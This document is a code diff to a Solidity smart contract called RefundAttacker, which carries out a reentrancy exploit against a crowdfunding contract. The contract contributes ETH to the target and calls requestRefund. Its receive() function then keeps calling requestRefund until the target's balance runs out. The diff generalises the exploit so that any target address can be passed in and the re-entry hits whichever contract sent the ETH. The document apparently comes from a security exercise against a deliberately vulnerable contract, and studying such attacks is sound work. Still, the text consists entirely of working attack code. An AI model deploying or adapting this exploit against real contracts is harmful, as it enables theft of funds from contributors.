@@ -13,7 +13,7 @@ contract RefundAttacker {
     address payable public attacker;
 
     
-    ICrowdfundVulnerable public vulnerable;
+    
     uint256 public lastContributionAmount;
 
     modifier onlyAttacker() {
@@ -21,35 +21,42 @@ contract RefundAttacker {
         _;
     }
 
-    constructor(address _vulnerable) {
+    constructor() {
         attacker = payable(msg.sender);
-        vulnerable = ICrowdfundVulnerable(_vulnerable);
+        
     }
 
     // STEP 1: EOA sends ETH into attacker contract
     function fundAttacker() external payable onlyAttacker {}
 
     // STEP 2: Contribute attacker contract balance into the crowdfund
-    function contributeFromContract(uint256 amount) external onlyAttacker {
+    function contributeFromContract(
+        address targetCrowdfund,
+        uint256 amount
+    ) external onlyAttacker {
         require(amount > 0, "Amount required");
         require(address(this).balance >= amount, "Insufficient attacker balance");
+        require(targetCrowdfund != address(0), "Target required");
 
         lastContributionAmount = amount;
-        vulnerable.contribute{value: amount}();
+        ICrowdfundVulnerable(targetCrowdfund).contribute{value: amount}();
     }
 
     // STEP 3: Trigger reentrancy (no ETH should be forwarded)
-    function runAttack(uint256 amount) external onlyAttacker {
+    function runAttack(address targetCrowdfund, uint256 amount) external onlyAttacker {
         require(amount > 0, "Amount required");
         require(amount == lastContributionAmount, "Amount must match contribution");
-        require(vulnerable.contributions(address(this)) >= amount, "Crowdfund contribution missing");
-        vulnerable.requestRefund();
+        require(targetCrowdfund != address(0), "Target required");
+
+        ICrowdfundVulnerable target = ICrowdfundVulnerable(targetCrowdfund);
+        require(target.contributions(address(this)) >= amount, "Crowdfund contribution missing");
+        target.requestRefund();
     }
 
     // STEP 4: Reentrancy loop – called when vulnerable sends ETH back
     receive() external payable {
-        if (address(vulnerable).balance >= lastContributionAmount && lastContributionAmount > 0) {
-            vulnerable.requestRefund();
+        if (address(msg.sender).balance >= lastContributionAmount && lastContributionAmount > 0) {
+            ICrowdfundVulnerable(msg.sender).requestRefund();
         }
     }
 
